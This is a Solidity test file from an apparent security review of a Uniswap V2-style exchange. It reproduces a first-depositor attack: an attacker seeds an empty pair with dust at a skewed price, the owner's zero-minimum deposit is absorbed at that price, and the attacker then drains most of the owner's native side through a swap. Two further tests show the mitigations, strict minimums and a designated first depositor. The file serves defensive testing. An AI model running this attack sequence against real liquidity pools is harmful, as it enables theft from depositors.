// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Review r16 (agent 309), finding R309-MC-1. The multichain "reference plan": firstDepositor = address(0), no caps.
// The deploy script creates the pair in step 2; the owner's first deposit is step 5, after finality and the gate.
// In between the pair is empty and open to anyone. Token "USDC" here has 18 decimals; prices: 1 native = 3,000.
import {TestBase, TestToken} from "../TestBase.sol";
import {WBLCH} from "../../contracts/assets/WBLCH.sol";
import {UniswapV2Factory} from "../../contracts/UniswapV2Factory.sol";
import {UniswapV2Pair} from "../../contracts/UniswapV2Pair.sol";
import {BDexRouter} from "../../contracts/periphery/BDexRouter.sol";

interface OriginVm {
    function startPrank(address sender, address origin) external;
}

contract McFirstDepositTest is TestBase {
    OriginVm constant ovm = OriginVm(address(uint160(uint256(keccak256("hevm cheat code")))));
    address constant FEE_TO = 0x775a993F09Bd80aeCF8F8c2ADe0C84158E3a0544;
    address constant OWNER = address(0xA11CE);
    address constant ATTACKER = address(0xBAD);
    WBLCH wrapped;
    TestToken usdc;

    function setUp() public {
        wrapped = new WBLCH();
        usdc = new TestToken();
        vm.deal(OWNER, 100 ether);
        vm.deal(ATTACKER, 100 ether);
        usdc.mint(OWNER, 30_000 ether);
        usdc.mint(ATTACKER, 10_000 ether);
    }

    function _deploy(address firstDepositor) private returns (BDexRouter router, UniswapV2Pair pair) {
        UniswapV2Factory factory = new UniswapV2Factory(FEE_TO, firstDepositor, new address[](0), new uint256[](0));
        router = new BDexRouter(address(factory), address(wrapped));
        pair = UniswapV2Pair(factory.createPair(address(wrapped), address(usdc))); // step 2 of the document
    }

    /// The attacker opens the pool with dust at 1 native = 2 "USDC" (instead of 3,000). No mempool race is needed:
    /// the pair stays empty from step 2 to step 5.
    function _hostileFirstMint(UniswapV2Pair pair) private {
        ovm.startPrank(ATTACKER, ATTACKER);
        wrapped.deposit{value: 1e12}(); // 0.000001 native
        wrapped.transfer(address(pair), 1e12);
        usdc.transfer(address(pair), 2e12); // 0.000002 USDC
        pair.mint(ATTACKER);
        vm.stopPrank();
    }

    /// Correct behaviour of the PACKAGE: its defaults and its document must make this impossible (firstDepositor set),
    /// or the first-deposit command must carry minimums equal to the amounts and a check that the pair is empty.
    function test_R309_MC_1_openFirstDeposit_looseMinimums_ownerLosesTheNativeSide() public {
        (BDexRouter router, UniswapV2Pair pair) = _deploy(address(0));
        _hostileFirstMint(pair);

        // Step 5 as the document gives it: "the minimums as the owner chooses". Here: 0 and 0.
        ovm.startPrank(OWNER, OWNER);
        usdc.approve(address(router), 30_000 ether);
        (uint256 usedToken, uint256 usedNative,) =
            router.addLiquidityBLCH{value: 10 ether}(address(usdc), 30_000 ether, 0, 0, OWNER, block.timestamp);
        vm.stopPrank();
        // The owner's 10 native went in against 20 USDC, not 30,000.
        assertEq(usedNative, 10 ether);
        assertEq(usedToken, 20 ether);

        // The attacker buys the native side with 600 USDC.
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(wrapped);
        uint256 before = ATTACKER.balance;
        ovm.startPrank(ATTACKER, ATTACKER);
        usdc.approve(address(router), 600 ether);
        router.swapExactTokensForBLCH(600 ether, 0, path, ATTACKER, block.timestamp);
        vm.stopPrank();
        uint256 taken = ATTACKER.balance - before;
        assertTrue(taken > 9.6 ether); // more than 9.6 of the owner's 10 native (about 29,000 USDC) for 600 USDC
    }

    function test_strictMinimums_turnTheSameAttackIntoARevert() public {
        (BDexRouter router, UniswapV2Pair pair) = _deploy(address(0));
        _hostileFirstMint(pair);
        ovm.startPrank(OWNER, OWNER);
        usdc.approve(address(router), 30_000 ether);
        vm.expectRevert(bytes("BDEX: INSUFFICIENT_A_AMOUNT"));
        router.addLiquidityBLCH{value: 10 ether}(address(usdc), 30_000 ether, 30_000 ether, 10 ether, OWNER, block.timestamp);
        vm.stopPrank();
    }

    function test_firstDepositorSet_theHostileFirstMintIsRefused() public {
        (BDexRouter router, UniswapV2Pair pair) = _deploy(OWNER);
        ovm.startPrank(ATTACKER, ATTACKER);
        wrapped.deposit{value: 1e12}();
        wrapped.transfer(address(pair), 1e12);
        usdc.transfer(address(pair), 2e12);
        vm.expectRevert(bytes("BDEX: FIRST_DEPOSITOR"));
        pair.mint(ATTACKER);
        vm.stopPrank();
        // The dust the attacker left is a gift to the opening pool; the owner opens at the owner's price.
        ovm.startPrank(OWNER, OWNER);
        usdc.approve(address(router), 30_000 ether);
        router.addLiquidityBLCH{value: 10 ether}(address(usdc), 30_000 ether, 30_000 ether, 10 ether, OWNER, block.timestamp);
        vm.stopPrank();
        (uint112 r0, uint112 r1,) = pair.getReserves();
        (uint256 rNative, uint256 rToken) = pair.token0() == address(wrapped) ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        assertEq(rNative, 10 ether + 1e12);
        assertEq(rToken, 30_000 ether + 2e12);
    }
}
